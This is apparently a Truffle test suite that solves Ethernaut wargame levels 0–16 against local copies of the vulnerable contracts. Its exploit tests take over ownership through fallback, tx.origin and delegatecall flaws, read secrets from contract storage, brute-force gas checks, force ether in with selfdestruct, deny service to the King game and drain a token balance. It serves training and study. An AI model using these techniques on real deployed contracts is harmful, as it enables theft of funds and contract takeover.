const Instance             = artifacts.require("Instance");
const Fallback             = artifacts.require("Fallback");
const Fallout              = artifacts.require("Fallout");
const CoinFlip             = artifacts.require("CoinFlip");
const CoinFlipExploit      = artifacts.require("CoinFlipExploit");
const Telephone            = artifacts.require("Telephone");
const TelephoneExploit     = artifacts.require("TelephoneExploit");
const Token                = artifacts.require("Token");
const Delegate             = artifacts.require("Delegate");
const Force                = artifacts.require("Force");
const ForceExploit         = artifacts.require("ForceExploit");
const Vault                = artifacts.require("Vault");
const King                 = artifacts.require("King");
const KingExploit          = artifacts.require("KingExploit");
const Reentrance           = artifacts.require("Reentrance");
const ReentranceExploit    = artifacts.require("ReentranceExploit");
const Elevator             = artifacts.require("Elevator");
const ElevatorExploit      = artifacts.require("ElevatorExploit");
const Privacy              = artifacts.require("Privacy");
const Gatekeeper           = artifacts.require("Gatekeeper");
const GatekeeperExploit    = artifacts.require("GatekeeperExploit");
const GatekeeperTwo        = artifacts.require("GatekeeperTwo");
const GatekeeperTwoExploit = artifacts.require("GatekeeperTwoExploit");
const NaughtCoin           = artifacts.require("NaughtCoin");
const NaughtCoinExploit    = artifacts.require("NaughtCoinExploit");
const LibraryContract      = artifacts.require("LibraryContract");
const Preservation         = artifacts.require("Preservation");
const PreservationExploit  = artifacts.require("PreservationExploit");

const { expectRevert }     = require('@openzeppelin/test-helpers');

contract("Ethernaut", (accounts) => {
	const owner   = accounts[0];
	const user    = accounts[1];
	const hacker  = accounts[2];
	const invalid = "0x0000000000000000000000000000000000000000";
	const amount  = web3.utils.toWei("0.00001", "ether");

	describe("Level 0 - Instance", async () => {
		it("Deploy Instance Contract", async () => {
			let deployed = await Instance.deployed();
			assert(deployed, "Instance contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Instance.new("ethernaut0"); // initial password
			const passwordCurrent = await contract.password(); // password is public and as such can be stolen
			await contract.authenticate(passwordCurrent);
			const clearedCurrent = await contract.getCleared();
			assert(clearedCurrent, "Failed to pass level 0."); // clear to pass the level
		});
	});

	describe("Level 1 - Fallback", async () => {
		it("Deploy Fallback Contract", async () => {
			let deployed = await Fallback.deployed();
			assert(deployed, "Fallback contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Fallback.new();
			await contract.contribute({ from: hacker, value: amount }); // sned amount less than 0.001 ether to bypass "require" in the next call
			await web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount, data: null }); // trigger the receive() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
			try {
				await contract.withdraw(); // withdraw the whole balance to pass the level
			} catch (err) {
				const exceptionCurrent = err.reason;
				const exceptionExpected = "caller is not the owner";
				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 1.");
			}
			// another example without class objects
			/*
			const instance = Fallback.networks["5777"].address;
			const contract = new web3.eth.Contract(Fallback.abi, instance);
			await contract.methods.contribute().call({ from: hacker, value: amount });
			await web3.eth.sendTransaction({ from: hacker, to: instance, value: amount, data: null });
			const ownerCurrent = await contract.methods.owner().call();
			assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
			try {
				await contract.methods.withdraw().call();
			} catch (err) {
				const exceptionCurrent = err.reason;
				const exceptionExpected = "caller is not the owner";
				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 1.");
			}
			*/
		});
	});

	describe("Level 2 - Fallout", async () => {
		it("Deploy Fallout Contract", async () => {
			let deployed = await Fallout.deployed();
			assert(deployed, "Fallout contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Fallout.new();
			await contract.Fal1out({ from: hacker, value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
			const ownerCurrent = await contract.owner();
			assert.equal(hacker, ownerCurrent, "Failed to pass level 2.");
			try {
				await contract.collectAllocations({ from: hacker }); // withdraw the whole balance to pass the level
			} catch (err) {
				const exceptionCurrent = err.reason;
				const exceptionExpected = "caller is not the owner";
				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 2.");
			}
		});
	});

	describe("Level 3 - CoinFlip", async () => {
		it("Deploy CoinFlip and CoinFlipExploit Contracts", async () => {
			let deployed = await CoinFlip.deployed();
			assert(deployed, "CoinFlip contract is not deployed.");
			deployed = await CoinFlipExploit.deployed();
			assert(deployed, "CoinFlipExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await CoinFlip.new();
			const exploit = await CoinFlipExploit.new();
			for (let i = 0; i < 10; i++) {
				await exploit.run(contract.address); // reverse engineer the algorithm to always win
			}
			const count = await web3.utils.toBN(await contract.consecutiveWins());
			assert.equal(count, 10, "Failed to pass level 3."); // get 10 wins in a row to pass the level
		});
	});

	describe("Level 4 - Telephone", async () => {
		it("Deploy Telephone and TelephoneExploit Contracts", async () => {
			let deployed = await Telephone.deployed();
			assert(deployed, "Telephone contract is not deployed.");
			deployed = await TelephoneExploit.deployed();
			assert(deployed, "TelephoneExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Telephone.new();
			const exploit = await TelephoneExploit.new();
			await exploit.run(contract.address, hacker); // use a proxy contract to bypass "tx.origin" check | this will set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			assert.equal(hacker, ownerCurrent, "Failed to pass level 4."); // become the owner to pass the level
		});
	});

	describe("Level 5 - Token", async () => {
		it("Deploy Token Contract", async () => {
			let deployed = await Token.deployed();
			assert(deployed, "Token contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Token.new(amount, { from: owner });
			await expectRevert.unspecified(contract.transfer(user, amount + 1, { from: owner })); // cause the integer underflow to pass the level
		});
	});

	describe("Level 6 - Delegate", async () => {
		it("Deploy Delegate Contract", async () => {
			let deployed = await Delegate.deployed();
			assert(deployed, "Delegate contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Delegate.new(owner);
			await web3.eth.sendTransaction({ from: hacker, to: contract.address, data: web3.utils.keccak256("pwn()") }); // trigger the fallback() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			assert.equal(hacker, ownerCurrent, "Failed to pass level 6."); // become the owner to pass the level
		});
	});

	describe("Level 7 - Force", async () => {
		it("Deploy Force and ForceExploit Contracts", async () => {
			let deployed = await Force.deployed();
			assert(deployed, "Force contract is not deployed.");
			deployed = await ForceExploit.deployed();
			assert(deployed, "ForceExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Force.new();
			const exploit = await ForceExploit.new();
			const balanceOld = await web3.eth.getBalance(contract.address);
			await web3.eth.sendTransaction({ from: hacker, to: exploit.address, value: amount, data: null }); // send some balance to the exploit contract using the receive() function
			await exploit.destroy(contract.address, { from: hacker }); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
			const balanceNew = await web3.eth.getBalance(contract.address);
			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
		});
	});

	describe("Level 8 - Vault", async () => {
		it("Deploy Vault Contract", async () => {
			let deployed = await Vault.deployed();
			assert(deployed, "Vault contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Vault.new(web3.utils.utf8ToHex("ethernaut8")); // the password is stored in the contract storage which is public
			const passwordCurrent = web3.utils.hexToAscii(await web3.eth.getStorageAt(contract.address, 1)); // retrieve the password from the contract storage
			await contract.unlock(web3.utils.utf8ToHex(passwordCurrent));
			const locked = await contract.locked();
			assert(!locked, "Failed to pass level 8."); // unlock to pass the level
		});
	});

	describe("Level 9 - King", async () => {
		it("Deploy King and KingExploit Contracts", async () => {
			let deployed = await King.deployed();
			assert(deployed, "King contract is not deployed.");
			deployed = await KingExploit.deployed();
			assert(deployed, "KingExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await King.new({ from: owner, value: amount });
			const exploit = await KingExploit.new();
			await exploit.run(contract.address, { value: amount + 1 }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to "crash" the game
			// any new transaction (attempt to become a new king) will now revert because the previous king (exploit contract) does not have the receive() and fallback() functions
			await expectRevert.unspecified(web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount + 2, data: null })); // DoS the game to pass the level
		});
	});

	describe("Level 10 - Reentrance", async () => {
		it("Deploy Reentrance ReentranceExploit and Contracts", async () => {
			let deployed = await Reentrance.deployed();
			assert(deployed, "Reentrance contract is not deployed.");
			deployed = await ReentranceExploit.deployed();
			assert(deployed, "ReentranceExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Reentrance.new();
			const exploit = await ReentranceExploit.new();
			await contract.donate(user, { value: amount * 3 }); // put in some balance from other users
			// const balanceOld = await web3.eth.getBalance(contract.address);
			// await exploit.run(contract.address, { value: amount, gas: 4465030 }); // create the integer underflow using reentrancy
			// const balanceNew = await web3.eth.getBalance(contract.address);
			// assert(balanceNew > balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
			await expectRevert.unspecified(exploit.run(contract.address, { value: amount, gas: 4465030 })); // solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 11 - Elevator", async () => {
		it("Deploy Elevator and ElevatorExploit Contract", async () => {
			let deployed = await Elevator.deployed();
			assert(deployed, "Elevator contract is not deployed.");
			deployed = await ElevatorExploit.deployed();
			assert(deployed, "ElevatorExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Elevator.new();
			const exploit = await ElevatorExploit.new();
			await exploit.run(contract.address, 10);
			const top = await contract.top();
			assert(top, "Failed to pass level 11."); // get to the top floor to pass the level
		});
	});

	describe("Level 12 - Privacy", async () => {
		it("Deploy Privacy Contract", async () => {
			let deployed = await Privacy.deployed();
			assert(deployed, "Privacy contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Privacy.new([ // bytes32 array is stored in the contract storage which is public
				web3.utils.padLeft(web3.utils.asciiToHex("ether"), 64), // 32 bytes = 64 length / 2 hex chars
				web3.utils.padLeft(web3.utils.asciiToHex("naut"), 64),
				web3.utils.padLeft(web3.utils.asciiToHex("12"), 64) // this is the key we need
			]);
			// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
			const key = await web3.eth.getStorageAt(contract.address, 5); // retrieve the key from the contract storage
			await contract.unlock(key.substring(0, 32)); // convert / trim the key to bytes16 value
			const locked = await contract.locked();
			assert(!locked, "Failed to pass level 12."); // unlock to pass the level
		});
	});

	describe("Level 13 - Gatekeeper", async () => {
		it("Deploy Gatekeeper and GatekeeperExploit Contracts", async () => {
			let deployed = await Gatekeeper.deployed();
			assert(deployed, "Gatekeeper contract is not deployed.");
			deployed = await GatekeeperExploit.deployed();
			assert(deployed, "GatekeeperExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await Gatekeeper.new();
			const exploit = await GatekeeperExploit.new(); // use a proxy contract to bypass gateOne() and gateThree() modifiers
			for (let i = 15625; i < 15630; i++) {
				// brute-force the gas to bypass gateTwo() modifier | trial and error
				try {
					await exploit.run(contract.address, { from: hacker, gas: 800000 + i });
					// console.log(i); // required gas is 800000 + 15628 = 8015628
					break;
				} catch (err) {}
			}
			const entrantCurrent = await contract.entrant();
			assert.equal(hacker, entrantCurrent, "Failed to pass level 13."); // become the entrant to pass the level
		});
	});

	describe("Level 14 - GatekeeperTwo", async () => {
		it("Deploy GatekeeperTwo and GatekeeperTwoExploit Contracts", async () => {
			let deployed = await GatekeeperTwo.deployed();
			assert(deployed, "GatekeeperTwo contract is not deployed.");
			deployed = await GatekeeperTwoExploit.deployed();
			assert(deployed, "GatekeeperTwoExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await GatekeeperTwo.new();
			const exploit = await GatekeeperTwoExploit.new(contract.address, { from: hacker }); // use a proxy contract and constructor method to bypass gateOne(), gateTwo(), and gateThree() modifiers
			const entrantCurrent = await contract.entrant();
			assert.equal(hacker, entrantCurrent, "Failed to pass level 14."); // become the entrant to pass the level
		});
	});

	describe("Level 15 - NaughtCoin", async () => {
		it("Deploy NaughtCoin and NaughtCoinExploit Contracts", async () => {
			let deployed = await NaughtCoin.deployed();
			assert(deployed, "NaughtCoin contract is not deployed.");
			deployed = await NaughtCoinExploit.deployed();
			assert(deployed, "NaughtCoinExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const contract = await NaughtCoin.new(owner);
			const balanceCurrent = await contract.balanceOf(owner);
			await contract.approve(hacker, balanceCurrent); // calling publicly available and unprotected ERC20 methods "approve" and "transferFrom"
			await contract.transferFrom(owner, hacker, balanceCurrent, {from: hacker});
			const balanceNew = await contract.balanceOf(owner);
			assert.equal(balanceNew, 0, "Failed to pass level 15."); // make the target's balance zero to pass the level
			// another example using an exploit contract
			/*
			const contract = await NaughtCoin.new(owner);
			const exploit = await NaughtCoinExploit.new();
			const balanceCurrent = await contract.balanceOf(owner);
			await contract.approve(exploit.address, balanceCurrent);
			await exploit.run(contract.address, owner, balanceCurrent);
			const balanceNew = await contract.balanceOf(owner);
			assert.equal(balanceNew, 0, "Failed to pass level 15.");
			*/
		});
	});

	describe("Level 16 - Preservation", async () => {
		it("Deploy LibraryContract, Preservation, and PreservationExploit Contracts", async () => {
			let deployed = await LibraryContract.deployed();
			assert(deployed, "LibraryContract contract is not deployed.");
			deployed = await Preservation.deployed();
			assert(deployed, "Preservation contract is not deployed.");
			deployed = await PreservationExploit.deployed();
			assert(deployed, "PreservationExploit contract is not deployed.");
		});
		it("Exploit", async () => {
			const library = await LibraryContract.new();
			const contract = await Preservation.new(library.address, library.address);
			const exploit = await PreservationExploit.new();
			await contract.setFirstTime(exploit.address); // "delegatecall" to LibraryContract will overwrite "timeZone1Library" address due to incorrectly defined storage in LibraryContract
			await contract.setFirstTime((new Date()).getTime(), {from: hacker});
			const ownerCurrent = await contract.owner();
			assert.equal(hacker, ownerCurrent, "Failed to pass level 16."); // become the owner to pass the level
		});
	});
});
